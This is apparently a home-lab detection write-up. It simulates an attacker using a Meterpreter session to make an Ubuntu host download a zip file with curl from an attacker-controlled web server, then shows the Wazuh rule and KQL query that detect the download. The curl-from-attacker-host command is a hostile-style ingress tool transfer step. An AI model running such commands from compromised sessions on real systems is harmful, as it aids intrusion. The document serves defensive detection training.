# Phase 2: Scenario 1 - Suspicious ZIP File Download

## Attack Overview
- **Description**: Simulated a post-compromise action where the attacker, using a Meterpreter session, downloads a suspicious `.zip` file from the Arch Linux VM to the Ubuntu VM, mimicking malicious payload delivery or data staging. Suspicious downloads often use uncommon User-Agents or external IPs.
- **MITRE ATT&CK**: 
  - [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- **Objective**: Demonstrate detection of suspicious archive file downloads using Sysmon and Wazuh on Ubuntu, triggered via Meterpreter commands.
- **Date and Time**: June 14, 2025, ~10:55 PM IST

## Simulation Details
- **Environment**: 
  - **Target**: Ubuntu 24.04.2 LTS (hostname: `Ubuntu-SIEM`, IP: `192.168.1.2`, Wazuh agent: `ubuntu-2024.04.2`).
  - **Attacker**: Arch Linux (IP: `192.168.1.55`).
- **Sysmon Config**: Custom `config.xml` (artifact ID: `36f3b86c-313c-4105-b39b-6d3307f9e5d3`).
- **Simulation Command From Arch Linux**:
  ```bash
  echo "This is a test file" > /tmp/test.txt
  zip /tmp/suspicious.zip /tmp/test.txt
  python3 -m http.server 80 -d /tmp/
  ```
- **Simulation Command From Ubuntu (via Meterpreter)**:
  In Meterpreter session:
  ```
  shell
  curl -A "SuspiciousAgent/1.0" -o /tmp/suspicious.zip http://192.168.1.55:80/suspicious.zip
  exit
  ```
- **Execution**:
  1. Created a benign `.zip` file (`suspicious.zip`) on Arch Linux.
  2. Hosted the file on a Python web server.
  3. From the existing Meterpreter session on Ubuntu, opened a shell and used `curl` with a custom User-Agent to download the `.zip`.
  4. Verified file creation on Ubuntu.
- **Expected Events**:
  - **Sysmon Event ID 11**: File creation of `/tmp/suspicious.zip`.
  - **Sysmon Event ID 1**: Process creation of `curl` with `SuspiciousAgent/1.0`.
  - **Sysmon Event ID 3**: Network connection to `192.168.1.55:80`.
  - **Wazuh**: Alerts triggered by custom rule ID 100001.

## Detection in Wazuh
- **Wazuh Rule**: Custom rule ID 100001 (from `custom_rules.xml`, artifact ID: `f4e06552-dc85-49ca-aa77-cee4f332a6d0`):
  ```xml
  <rule id="100001" level="12">
    <if_sid>61611</if_sid>
    <field name="sysmon.target_filename">\.zip$|\.rar$|\.7z$</field>
    <field name="sysmon.command_line">192\.168\.1\.55</field>
    <description>Suspicious archive file downloaded from attacker IP</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>
  ```
- **Search Query** (Wazuh Dashboard > Security Events > Discover):
  ```kql
  rule.id:100001 AND agent.name:ubuntu-2024.04.2 AND sysmon.target_filename:"/tmp/suspicious.zip" AND sysmon.command_line:"192.168.1.55"
  ```
- **Findings**:
  - Observed 1+ alerts with `rule.id:100001`.
  - Sysmon Event ID 11 logged file creation of `/tmp/suspicious.zip`.
  - Event ID 1 captured `curl` execution with `SuspiciousAgent/1.0`.
  - Event ID 3 logged connection to `192.168.1.55:80`.
  - High `rule.level:12` indicates significant alert.
- **Screenshots**:
  - `Screenshots/wazuh_alerts_zip.png`: Wazuh Dashboard alert list.
  - `Screenshots/sysmon_log_zip.png`: Sysmon events in `/var/log/syslog`.
  - `Screenshots/meterpreter_zip_download.png`: Meterpreter shell output.
- **Logs**:
  - `Logs/sysmon_syslog_zip.txt`: Exported `/var/log/syslog` entries.
  - `Logs/wazuh_agent_filtered_zip.log`: Wazuh agent log entries.

## Learnings
- **Blue Teaming Insight**: Suspicious archive downloads are detectable through file creation and network activity. Sysmon’s file and network monitoring, combined with Wazuh’s custom rules, identifies post-compromise data staging.
- **Challenges**: Legitimate `.zip` downloads may trigger false positives; filtering by User-Agent or attacker IP reduces noise. Meterpreter shell commands may evade some detections if not logged properly.
- **Technical Growth**: Learned to execute network commands via Meterpreter, configure Sysmon for archive detection, and refine Wazuh KQL queries for file-based alerts.
- **Best Practice**: Monitor `/tmp` for archive files and set alerts for downloads from external IPs with unusual User-Agents.

## Detection Logic Query
```kql
rule.id:100001 AND agent.name:ubuntu-2024.04.2 AND sysmon.target_filename:"/tmp/suspicious.zip" AND sysmon.command_line:"192.168.1.55"
```
- **Purpose**: Identifies suspicious archive downloads by detecting `.zip` file creation from the attacker IP.
- **Outcome**: High-severity alert for unauthorized downloads, reducing false positives with filename and IP specificity.

## References
- [MITRE ATT&CK: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [Wazuh Documentation: Sysmon Integration](https://documentation.wazuh.com/current/user-manual/ruleset/sysmon.html)
- [Metasploit: Meterpreter Shell](https://docs.metasploit.com/docs/using-metasploit/basics/meterpreter.html)

## Attachments
- **Logs**: [Wazuh Log JSON](/DetectAndDefend/phase2/Scenario-1-Suspicious%20Zip%20File%20/logs/log1.json)
- **Screenshots**:
  1. [Attack Simulation from Meterpreter](/DetectAndDefend/phase2/Scenario-1-Suspicious%20Zip%20File%20/Screenshots/Arch-Linux-Attacker-MSF-Console.png)
  2. [Ubuntu Download Folder](/DetectAndDefend/phase2/Scenario-1-Suspicious%20Zip%20File%20/Screenshots/ubuntu-downloads-folder.png)
  3. [Wazuh Dashboard with Event Logs Only](/DetectAndDefend/phase2/Scenario-1-Suspicious%20Zip%20File%20/Screenshots/wazuh-dashboard-with-events-logged.png)
  4. [ Wazuh Event Log](/DetectAndDefend/phase2/Scenario-1-Suspicious%20Zip%20File%20/Screenshots/wazuh-log-1.png)